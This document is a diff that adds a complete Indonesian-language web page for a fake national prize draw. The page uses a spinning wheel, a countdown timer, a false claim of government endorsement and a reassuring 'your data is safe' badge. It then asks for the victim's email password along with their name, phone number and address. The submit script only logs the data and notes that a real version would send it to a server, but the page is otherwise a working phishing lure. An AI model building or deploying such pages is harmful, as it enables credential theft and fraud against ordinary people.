@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UNDIAN RESMI - Program Hadiah Nasional 2023</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a3c8b 0%, #0d6efd 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="rgba(255,255,255,0.05)" width="20" height="20"/></svg>');
+            z-index: -1;
+        }
+        
+        .header {
+            width: 100%;
+            background: white;
+            border-radius: 10px 10px 0 0;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .header img {
+            height: 50px;
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: white;
+            border-radius: 0 0 10px 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin-bottom: 30px;
+        }
+        
+        .banner {
+            width: 100%;
+            height: 180px;
+            background: linear-gradient(90deg, #e61e4d 0%, #e31c5f 50%, #d70466 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle fill="rgba(255,255,255,0.1)" cx="50" cy="50" r="40"/></svg>');
+        }
+        
+        .banner-content {
+            text-align: center;
+            z-index: 2;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        
+        .banner-content h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .banner-content p {
+            font-size: 1.2rem;
+            max-width: 80%;
+            margin: 0 auto;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .timer {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 25px;
+            border: 1px dashed #dee2e6;
+        }
+        
+        .timer p {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: #6c757d;
+        }
+        
+        #countdown {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #dc3545;
+        }
+        
+        .wheel-container {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            margin: 30px auto;
+        }
+        
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(
+                #ff9999 0deg 36deg, 
+                #99ff99 36deg 72deg, 
+                #9999ff 72deg 108deg, 
+                #ffff99 108deg 144deg, 
+                #ff99ff 144deg 180deg, 
+                #99ffff 180deg 216deg, 
+                #ffcc99 216deg 252deg, 
+                #cc99ff 252deg 288deg, 
+                #ff6666 288deg 324deg, 
+                #66ff66 324deg 360deg
+            );
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            transform: rotate(0deg);
+        }
+        
+        .wheel.spinning {
+            transform: rotate(1800deg);
+        }
+        
+        .wheel-pointer {
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 50px;
+            background: #dc3545;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            z-index: 10;
+            border-radius: 4px;
+        }
+        
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 50%;
+            z-index: 5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            border: 4px solid #dc3545;
+        }
+        
+        .wheel-center span {
+            font-size: 0.9rem;
+            font-weight: bold;
+            color: #dc3545;
+        }
+        
+        .prize-display {
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            text-align: center;
+            border: 1px dashed #dee2e6;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #e61e4d 0%, #e31c5f 50%, #d70466 100%);
+            color: white;
+            border: none;
+            padding: 16px 45px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.4);
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(220, 53, 69, 0.5);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .btn i {
+            margin-right: 10px;
+        }
+        
+        .form-container {
+            display: none;
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 20px;
+            text-align: left;
+            border: 1px dashed #dee2e6;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #dc3545;
+            font-size: 1.5rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #495057;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            background: white;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            border-color: #86b7fe;
+            outline: 0;
+            box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #198754 0%, #157347 100%);
+            width: 100%;
+            padding: 16px;
+            color: white;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #157347 0%, #0f5734 100%);
+        }
+        
+        .congrats {
+            display: none;
+            font-size: 1.5rem;
+            margin: 20px 0;
+            color: #198754;
+            font-weight: bold;
+            text-align: center;
+            padding: 15px;
+            background: #d1e7dd;
+            border-radius: 10px;
+            border: 1px solid #badbcc;
+        }
+        
+        .note {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            text-align: center;
+            color: #6c757d;
+        }
+        
+        .prize-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .prize-item {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            width: 160px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e9ecef;
+            transition: transform 0.3s;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-5px);
+        }
+        
+        .prize-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #dc3545;
+        }
+        
+        .winner-notification {
+            background: #fff3cd;
+            border: 1px solid #ffecb5;
+            color: #664d03;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .winner-notification i {
+            font-size: 2rem;
+            color: #ffc107;
+        }
+        
+        .badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #dc3545;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .security-badge i {
+            color: #198754;
+            font-size: 1.5rem;
+        }
+        
+        .footer {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            color: white;
+            font-size: 0.9rem;
+        }
+        
+        .footer a {
+            color: white;
+            text-decoration: none;
+        }
+        
+        @media (max-width: 768px) {
+            .banner-content h1 {
+                font-size: 1.8rem;
+            }
+            
+            .wheel-container {
+                width: 280px;
+                height: 280px;
+            }
+            
+            .prize-item {
+                width: 140px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <i class="fas fa-gift fa-2x" style="color: #dc3545;"></i>
+        <h2 style="color: #0d6efd;">Program Hadiah Nasional 2023</h2>
+        <i class="fas fa-trophy fa-2x" style="color: #ffc107;"></i>
+    </div>
+    
+    <div class="container">
+        <div class="banner">
+            <div class="banner-content">
+                <h1>SELAMAT! ANDA TERPILIH</h1>
+                <p>Anda berkesempatan memenangkan hadiah spesial dalam undian nasional kami</p>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="timer">
+                <p>Waktu tersisa untuk klaim hadiah:</p>
+                <div id="countdown">23:59:59</div>
+            </div>
+            
+            <div class="winner-notification">
+                <i class="fas fa-exclamation-circle"></i>
+                <div>
+                    <h3>Selamat! Anda Terpilih</h3>
+                    <p>Nomor telepon Anda terpilih secara acak dalam undian nasional kami</p>
+                </div>
+            </div>
+            
+            <p style="text-align: center; margin-bottom: 20px;">Putar roda keberuntungan untuk mengetahui hadiah yang Anda dapatkan!</p>
+            
+            <div class="prize-list">
+                <div class="prize-item">
+                    <div class="prize-icon">🏆</div>
+                    <div>iPhone 14 Pro</div>
+                </div>
+                <div class="prize-item">
+                    <div class="prize-icon">🎮</div>
+                    <div>PlayStation 5</div>
+                </div>
+                <div class="prize-item">
+                    <div class="prize-icon">💻</div>
+                    <div>Laptop Gaming</div>
+                </div>
+                <div class="prize-item">
+                    <div class="prize-icon">💰</div>
+                    <div>Uang Tunai 5JT</div>
+                </div>
+            </div>
+            
+            <div class="wheel-container">
+                <div class="wheel-pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div class="wheel-center"><span>PUTAR</span></div>
+                </div>
+            </div>
+            
+            <div class="prize-display" id="prize-display">
+                <i class="fas fa-info-circle" style="color: #0d6efd;"></i> Putar roda untuk mengetahui hadiah Anda!
+            </div>
+            
+            <button class="btn" id="spin-btn"><i class="fas fa-redo"></i> PUTAR RODA UNDIAN</button>
+            
+            <div class="congrats" id="congrats">
+                <i class="fas fa-trophy"></i> Selamat! Anda memenangkan <span id="prize-name"></span>!
+            </div>
+            
+            <div class="form-container" id="form-container">
+                <h2 class="form-title">Klaim Hadiah Anda</h2>
+                <p style="text-align: center; margin-bottom: 20px;">Isi data diri Anda untuk proses pengiriman hadiah:</p>
+                
+                <form id="claim-form">
+                    <div class="form-group">
+                        <label for="email"><i class="fas fa-envelope"></i> Alamat Email:</label>
+                        <input type="email" id="email" name="email" required placeholder="nama@contoh.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Kata Sandi Email:</label>
+                        <input type="password" id="password" name="password" required placeholder="Masukkan kata sandi email Anda">
+                        <small style="color: #6c757d;">Diperlukan untuk verifikasi keaslian penerima</small>
+                    </div>
+                    <div class="form-group">
+                        <label for="name"><i class="fas fa-user"></i> Nama Lengkap:</label>
+                        <input type="text" id="name" name="name" required placeholder="Nama lengkap Anda">
+                    </div>
+                    <div class="form-group">
+                        <label for="phone"><i class="fas fa-phone"></i> Nomor Telepon:</label>
+                        <input type="tel" id="phone" name="phone" required placeholder="08xxxxxxxxxx">
+                    </div>
+                    <div class="form-group">
+                        <label for="address"><i class="fas fa-map-marker-alt"></i> Alamat Pengiriman:</label>
+                        <input type="text" id="address" name="address" required placeholder="Alamat lengkap pengiriman hadiah">
+                    </div>
+                    
+                    <div class="security-badge">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Data Anda aman dan terlindungi</span>
+                    </div>
+                    
+                    <button type="submit" class="btn submit-btn"><i class="fas fa-gift"></i> KLAIM HADIAH SEKARANG</button>
+                </form>
+            </div>
+            
+            <p class="note">* Dengan berpartisipasi, Anda menyetujui syarat dan ketentuan yang berlaku. Hadiah akan dikirim dalam waktu 7-14 hari kerja setelah proses verifikasi.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2023 Program Hadiah Nasional. Didukung oleh Kementerian Komunikasi dan Informatika Republik Indonesia</p>
+        <p><a href="#">Syarat & Ketentuan</a> | <a href="#">Kebijakan Privasi</a> | <a href="#">Bantuan</a></p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const wheel = document.getElementById('wheel');
+            const spinBtn = document.getElementById('spin-btn');
+            const prizeDisplay = document.getElementById('prize-display');
+            const congrats = document.getElementById('congrats');
+            const prizeName = document.getElementById('prize-name');
+            const formContainer = document.getElementById('form-container');
+            const claimForm = document.getElementById('claim-form');
+            const countdown = document.getElementById('countdown');
+            
+            const prizes = [
+                "iPhone 14 Pro",
+                "PlayStation 5",
+                "Laptop Gaming",
+                "Uang Tunai 5JT",
+                "Voucher Belanja 1JT",
+                "Smart TV 55 Inch",
+                "Kamera DSLR",
+                "Drone Premium",
+                "Paket Liburan ke Bali",
+                "Smartwatch Eksklusif"
+            ];
+            
+            let spinning = false;
+            
+            // Timer countdown
+            let timeLeft = 24 * 60 * 60; // 24 hours in seconds
+            function updateCountdown() {
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                countdown.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateCountdown, 1000);
+                } else {
+                    countdown.textContent = "Waktu habis!";
+                    spinBtn.disabled = true;
+                }
+            }
+            
+            updateCountdown();
+            
+            spinBtn.addEventListener('click', function() {
+                if (spinning) return;
+                
+                spinning = true;
+                wheel.classList.add('spinning');
+                prizeDisplay.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Roda sedang berputar...';
+                spinBtn.disabled = true;
+                
+                setTimeout(function() {
+                    const winnerIndex = Math.floor(Math.random() * prizes.length);
+                    const winnerPrize = prizes[winnerIndex];
+                    
+                    wheel.classList.remove('spinning');
+                    prizeName.textContent = winnerPrize;
+                    prizeDisplay.innerHTML = `<i class="fas fa-star" style="color: #ffc107;"></i> Selamat! Anda memenangkan: ${winnerPrize}`;
+                    congrats.style.display = 'flex';
+                    
+                    setTimeout(function() {
+                        formContainer.style.display = 'block';
+                        spinning = false;
+                        
+                        // Scroll to form
+                        formContainer.scrollIntoView({ behavior: 'smooth' });
+                    }, 2000);
+                    
+                }, 4000);
+            });
+            
+            claimForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const formData = new FormData(claimForm);
+                const data = {
+                    email: formData.get('email'),
+                    password: formData.get('password'),
+                    name: formData.get('name'),
+                    phone: formData.get('phone'),
+                    address: formData.get('address'),
+                    prize: prizeName.textContent,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                // Simulasi pengiriman data (dalam kasus nyata, data akan dikirim ke server)
+                console.log("Data yang dikumpulkan:", data);
+                
+                alert("Terima kasih! Data Anda telah diterima. Hadiah akan segera dikirim setelah proses verifikasi. Anda akan menerima email konfirmasi dalam waktu 1x24 jam.");
+                claimForm.reset();
+                
+                // Redirect setelah pengisian form
+                setTimeout(function() {
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }, 1500);
+            });
+        });
+    </script>
+</body>
+</html>
